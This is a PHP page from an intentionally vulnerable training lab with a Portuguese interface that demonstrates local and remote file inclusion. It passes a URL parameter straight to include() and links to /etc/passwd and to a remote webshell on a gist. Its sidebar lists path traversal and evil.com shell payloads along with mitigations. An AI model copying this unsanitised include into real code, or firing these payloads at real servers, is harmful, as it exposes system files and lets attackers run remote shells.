<?php
defined('APP') or die('Access denied');
?>

<div class="container mt-4">
    <h3>🗂️ File Inclusion Lab</h3>

    <div class="alert alert-danger" role="alert">
        <strong>⚠️ Aviso:</strong> Esta página contém vulnerabilidades de inclusão de arquivo para fins educacionais!
    </div>

    <div class="row">
        <div class="col-md-8">
            <div class="card">
                <div class="card-header">
                    <h5>Teste de Inclusão de Arquivos</h5>
                </div>
                <div class="card-body">
                    <p>Use os exemplos abaixo ou digite um caminho customizado:</p>

                    <form method="GET" class="mb-3">
                        <input type="hidden" name="page" value="file-inclusion">
                        <div class="input-group">
                            <input type="text" name="file" class="form-control" placeholder="Digite o caminho do arquivo..." value="<?php echo isset($_GET['file']) ? htmlspecialchars($_GET['file']) : ''; ?>">
                            <button class="btn btn-primary" type="submit">Incluir Arquivo</button>
                        </div>
                    </form>

                    <h6>Exemplos Rápidos:</h6>
                    <div class="d-grid gap-2 d-md-block">
                        <a href="?page=file-inclusion&file=outra_pagina.php" class="btn btn-outline-success btn-sm">📄 Página PHP Local</a>
                        <a href="?page=file-inclusion&file=/etc/passwd" class="btn btn-outline-warning btn-sm">🐧 /etc/passwd (Linux)</a>
                        <a href="?page=file-inclusion&file=https://www.google.com.br" class="btn btn-outline-info btn-sm">🌐 Site Externo</a>
                        <a href="?page=file-inclusion&file=https://gist.githubusercontent.com/ricardomaia/f57204019bf64715ed6b1f587a7428d7/raw/9183e4f0a38a4d6c5478dbd70ca2ad2b1819cd50/webshell.php" class="btn btn-outline-danger btn-sm">🐚 Remote Webshell</a>
                    </div>
                </div>
            </div>

            <?php
            if (isset($_GET['file'])) {
                $file = $_GET['file'];
                echo "<div class='card mt-3'>";
                echo "<div class='card-header'>";
                echo "<h6>📁 Resultado da Inclusão</h6>";
                echo "<small class='text-muted'>Arquivo: <code>" . htmlspecialchars($file) . "</code></small>";
                echo "</div>";
                echo "<div class='card-body'>";
                echo "<div class='border p-3 bg-light'>";

                // Capture output
                ob_start();
                try {
                    include($file);
                    $content = ob_get_contents();
                } catch (Exception $e) {
                    $content = "Erro: " . $e->getMessage();
                } catch (Error $e) {
                    $content = "Erro: " . $e->getMessage();
                }
                ob_end_clean();

                echo $content;
                echo "</div>";
                echo "</div>";
                echo "</div>";
            }
            ?>
        </div>

        <div class="col-md-4">
            <div class="card">
                <div class="card-header">
                    <h6>💡 File Inclusion Vulnerabilities</h6>
                </div>
                <div class="card-body">
                    <div class="accordion" id="inclusionExamples">
                        <div class="accordion-item">
                            <h2 class="accordion-header" id="headingLFI">
                                <button class="accordion-button" type="button" data-bs-toggle="collapse" data-bs-target="#collapseLFI">
                                    Local File Inclusion (LFI)
                                </button>
                            </h2>
                            <div id="collapseLFI" class="accordion-collapse collapse show" data-bs-parent="#inclusionExamples">
                                <div class="accordion-body">
                                    <strong>Arquivos do sistema:</strong><br>
                                    <code>/etc/passwd</code><br>
                                    <code>/etc/hosts</code><br>
                                    <code>/proc/version</code><br><br>

                                    <strong>Path Traversal:</strong><br>
                                    <code>../../../etc/passwd</code><br>
                                    <code>....//....//etc/passwd</code><br>
                                    <code>..%2F..%2F..%2Fetc%2Fpasswd</code>
                                </div>
                            </div>
                        </div>

                        <div class="accordion-item">
                            <h2 class="accordion-header" id="headingRFI">
                                <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#collapseRFI">
                                    Remote File Inclusion (RFI)
                                </button>
                            </h2>
                            <div id="collapseRFI" class="accordion-collapse collapse" data-bs-parent="#inclusionExamples">
                                <div class="accordion-body">
                                    <strong>Arquivos remotos:</strong><br>
                                    <code>http://evil.com/shell.php</code><br>
                                    <code>https://pastebin.com/raw/xyz</code><br>
                                    <code>ftp://server/file.php</code><br><br>

                                    <strong>Bypass de filtros:</strong><br>
                                    <code>http://evil.com/shell.txt</code><br>
                                    <code>data://text/plain,&lt;?php phpinfo();?&gt;</code>
                                </div>
                            </div>
                        </div>

                        <div class="accordion-item">
                            <h2 class="accordion-header" id="headingMitigation">
                                <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#collapseMitigation">
                                    Mitigação
                                </button>
                            </h2>
                            <div id="collapseMitigation" class="accordion-collapse collapse" data-bs-parent="#inclusionExamples">
                                <div class="accordion-body">
                                    <ul class="list-unstyled">
                                        <li>✅ Validar entrada do usuário</li>
                                        <li>✅ Usar whitelist de arquivos</li>
                                        <li>✅ Desabilitar allow_url_include</li>
                                        <li>✅ Usar realpath() e basename()</li>
                                        <li>✅ Configurar open_basedir</li>
                                    </ul>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>